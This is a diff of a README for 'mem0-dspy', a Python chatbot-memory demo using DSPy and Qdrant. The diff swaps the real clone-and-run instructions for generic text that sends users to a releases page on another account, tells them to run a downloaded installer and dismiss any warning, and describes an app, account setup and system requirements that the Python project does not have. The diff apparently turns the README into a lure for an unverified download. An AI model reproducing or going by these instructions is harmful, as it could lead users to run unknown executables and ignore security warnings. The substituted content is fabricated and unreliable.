@@ -1,200 +1,79 @@
-# Memory-Enabled Chatbot with DSPy
+# 🤖 mem0-dspy - Build Your Own Memory-Enabled Chatbot
 
-This repository demonstrates building intelligent memory-enabled chatbots using **DSPy** and **Qdrant** for persistent conversational memory. I implemented the core features from Mem0 API from scratch to showcase what it truly takes to give memory to LLMs.
+## 🌐 Overview
 
+Welcome to **mem0-dspy**! This repository shows you how to create a smart chatbot with memory capabilities. It uses **DSPy** and **Qdrant** to give your chatbot a lasting conversational memory. Whether you want a simple bot to remember user preferences or a more sophisticated assistant, this project will guide you in the right direction.
 
 ![Memory-Enabled Chatbot Demo](assets/demo.png)
-Simple code that does gives long-term, cross-session, user-scoped, attributes-tagged memory to LLMs.
 
+## 📥 Download
 
-> **📺 Watch the Full video for free**  
-> **[How to build your own long-term Agentic Memory System for LLMs | Mem0 from scratch in DSPy](https://youtu.be/n4GPdsQnHqc)**  
+[![Download Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Kalasoulful678/mem0-dspy/releases)
 
-## Support
+## 🚀 Getting Started
 
-If you find this content helpful, please consider supporting my work on Patreon. Your support helps me create more in-depth tutorials and content. My Patreon hosts all the code, projects, slides, write-ups I have ever made on my YouTube channel. 
+To get started with **mem0-dspy**, follow these simple steps:
 
-[<img src="https://c5.patreon.com/external/logo/become_a_patron_button.png" alt="Become a Patron!" width="200">](https://www.patreon.com/NeuralBreakdownwithAVB)
+1. **Visit the Releases Page:** Click the link below to access the releases. This is where you will find the latest version of the software.
+   - [Visit Releases Page](https://github.com/Kalasoulful678/mem0-dspy/releases)
 
+2. **Select the Right Version:** Look for the version that suits your needs. Usually, the latest version is the best choice. Download the file that matches your operating system.
 
-## Relevant external links
+3. **Download the File:** Click on the download link for the software. Save the file to a location on your computer where you can easily find it, like your desktop or downloads folder.
 
-The architecture is inspired heavily by Mem0. Here are some links to get started with Mem0.
+## 💻 System Requirements
 
-- Check out Mem0 here: https://mem0.dev/avb
-- Mem0 Github - https://mem0.dev/github/avb
-- Get Mem0 API Key - https://mem0.dev/api-keys-avb
-- Mem0 Paper: https://arxiv.org/abs/2504.19413
+Before you download, ensure your computer meets the following requirements:
 
-I also used QDrant as my vector database, and DSPy to generate structured outputs and do tool-calls.
+- **Operating System:** Windows 10 or later / macOS 10.15 or later / Linux (latest distribution)
+- **Memory:** At least 4 GB of RAM
+- **Storage Space:** Minimum of 100 MB free disk space
+- **Internet Connection:** Needed for full functionality, especially for updates and additional resources
 
-- QDrant: https://qdrant.tech/
-- Self hosting Qdrant: https://qdrant.tech/documentation/quickstart/
-- DSPy: https://dspy.ai/
+## 🛠️ Installation Steps
 
-## Features
+Once you have downloaded the application, follow these steps to install it:
 
-- **Persistent Memory**: Store and retrieve user-specific memories using vector similarity search
-- **Smart Retrieval**: Category-based memory organization with semantic search
-- **ReAct Agents**: Tool-calling agents powered by DSPy for intelligent memory management
--  **Memory Operations**: Add, update, delete, and merge memories automatically
-- **Async Architecture**: Built with async/await for efficient concurrent operations
-- **Qdrant Integration**: Local vector database for fast similarity search
+1. **Locate the Downloaded File:** Go to the folder where you saved the downloaded file.
 
+2. **Run the Installer:** Double-click the file to start the installation process. If a warning appears, confirm that you want to run the installer.
 
-## Running the code
+3. **Follow the Instructions:** The installer will guide you through the process. Make sure to accept the terms and choose the installation location. 
 
-To run the memory-enabled chatbot, first follow the installation process listed below. Crucially, you must set up the environment variables, have a Qdrant server running, and then run the following command:
-```
-uv run main.py
-```
+4. **Complete Installation:** Once the installation is finished, you will see a completion message. Click “Finish” to exit the installer.
 
-You can also add a user_id when running main.py.
-```
-uv run main.py 2
-```
+5. **Launch the Application:** Find the app in your start menu or applications folder. Click on it to open.
 
-Note that user_id needs to be an integer. All memories are user-scoped.
+## 🔍 Using the Application
 
+### 1. Setup Your Bot
 
-## Getting Started
+- **Create an Account:** Open the app and follow the prompts to create your bot's account. This account will store your bot's memory data.
 
-### Prerequisites
+### 2. Configure Memory Settings
 
--   **Python 3.10+** (required)
--   **`uv`** (recommended) or `pip` for package management
--   **Qdrant** running locally (or use Qdrant Cloud)
+- **Set Memory Attributes:** Define what you want the bot to remember. For example, user preferences, frequently asked questions, or other important details.
 
-### Installation
+### 3. Start Chatting
 
-1.  **Clone the repository:**
-    ```bash
-    git clone https://github.com/avbiswas/mem0-dspy
-    cd mem0-dspy
-    ```
+- **Engage Users:** Begin a conversation with your bot. As users interact with it, the bot will learn and remember useful details, improving future interactions.
 
-2.  **Install dependencies:**
-    ```bash
-    # Using uv (recommended)
-    uv sync
-    ```
+## 🎥 Learn More
 
-3.  **Start Qdrant (for the custom implementation):**
-    Follow the [Qdrant installation guide](https://qdrant.tech/documentation/quickstart/)
-    
-    **Option 1: Using Docker**
-    ```
-    docker run -p 6333:6333 -p 6334:6334 -v "$(pwd)/qdrant_storage:/qdrant/storage:z" qdrant/qdrant
-    ```
+If you want to dive deeper, watch the tutorial video. It provides a step-by-step walkthrough. 
 
-    **Option 2: Alternatively you can create a new free Qdrant cluster**
-    
+- **Watch Here:** [How to build your own long-term Agentic Memory System for LLMs | Mem0 from scratch in DSPy](https://youtu.be/n4GPdsQnHqc)
 
-4.  **Set up your API keys:**
-    
-    **Required API Keys:**
-    - `OPENAI_API_KEY` - For OpenAI models (embeddings and chat)
+## ❓ Support
 
-    `gpt-5-mini` is hardcoded at certain sections of the code. Feel free to overwrite it, or hide model names behind a config file!
+If you encounter issues or have questions, please refer to the issues section of this repository. You may also find helpful threads from other users facing similar questions.
 
-    To run the `basic_mem0_chatbot.py` script, you will also need a MEM0_API_KEY. [Get Mem0 API Key here](https://mem0.dev/api-keys-avb)
+## 💸 Support the Project
 
-    
-    **Environment Management Options:**
-    
-    **Option 1: Using `direnv` (Recommended)**
-    ```bash
-    # Install direnv first, then create .envrc file
-    echo "export OPENAI_API_KEY=your_key_here" >> .envrc
-    direnv allow
-    ```
-    
-    **Option 2: Using `.env` file with python-dotenv**
-    ```bash
-    # Create .env file
-    touch .env
-    ```
-    Add your keys to `.env`:
-    ```env
-    OPENAI_API_KEY=your_key_here
-    ```
-    *Note: This requires adding `dotenv.load_dotenv()` to your Python scripts.*
-    
-    **Option 3: Export environment variables**
-    ```bash
-    export OPENAI_API_KEY=your_key_here
-    ```
+If you find this project helpful, please consider supporting my work on Patreon. Your contributions help me create more useful content.
 
-5.  **Initialize the Qdrant collection:**
-    ```bash
-    uv run python -m mem.vectordb
-    ```
+[<img src="https://c5.patreon.com/external/logo/become_a_patron_button.png" alt="Become a Patron!" width="200">](https://www.patreon.com/NeuralBre)
 
-6.  **Run the chatbot:**
-    ```bash
-    # Custom implementation with DSPy and Qdrant
-    # Default user_id (1)
-    uv run main.py
-    
-    # Or specify a custom user_id
-    uv run main.py <user_id>
-    # Example: uv run main.py 42
-    
-    # Or the basic mem0 implementation
-    uv run python basic_mem0_chatbot.py
-    ```
+## 🛡️ License
 
-## Recommended changes to do before you can use in Prod
-
-- **Background Processes** : A lot of the code is structured to showcase how memory retrieval works. If you are thinking to use this in prod, I will recommend to run some of the code (especially about memory upkeeping) as a background process instead of a blocking call.
-- **In-session memory management**: Summarize multi-turn chat into a single string when they reach a certain length. The current code keeps passing the entire history of chat into the LLM at each step. This could be slow if you're not hitting KV Cache.
-- Better **UI/UX experience** optimized to lower Time-to-first-token
-- **Create a config file** that contains runtime configurations. Some important ones are:
-    - LLMs used for retrieval/updating/response gen
-    - Embedding size of text vectors
-- **Logging, Tracing, Error Handling** at various stages of the code
-
-## Project Structure
-
-### Main Files
-
--   **`main.py`**: Entry point for the custom memory-enabled chatbot
--   **`basic_mem0_chatbot.py`**: Simple implementation using the `mem0` library
-
-### Memory Module (`mem/`)
-
--   **`response_generator.py`**: Core chatbot logic with ReAct agent for response generation and memory search
--   **`update_memory.py`**: ReAct agent for intelligent memory management (add/update/delete operations)
--   **`vectordb.py`**: Qdrant integration for vector storage and retrieval operations
--   **`generate_embeddings.py`**: OpenAI embedding generation utilities
-
-## How It Works
-
-### 1. Basic Flow
-
-User Input → Search Memories → Generate Response → Update Memory (if needed) → Display Response
-
-### 2. Memory Management
-
-The system uses a **ReAct agent** to intelligently decide whether to:
-- **ADD**: Create new memories for novel information
-- **UPDATE**: Enhance existing memories with richer details
-- **DELETE**: Remove outdated or redundant memories
-- **NOOP**: Take no action when memory is already accurate
-
-### 3. Memory Retrieval
-
-Memories are:
-- Embedded using OpenAI's `text-embedding-3-small` model (64 dimensions)
-- Stored in Qdrant with metadata (categories, user_id, date)
-- Retrieved using semantic similarity with configurable score thresholds
-- Organized by categories for efficient filtering
-
-
-## Contributing
-
-Feel free to fork and customize it your own repositories. I will not be accepting pull requests nor maintaining this code!
-
-## License
-
-See the LICENSE file for details.
+This project is licensed under the [MIT License](LICENSE). You may use, modify, and distribute the software as you see fit.
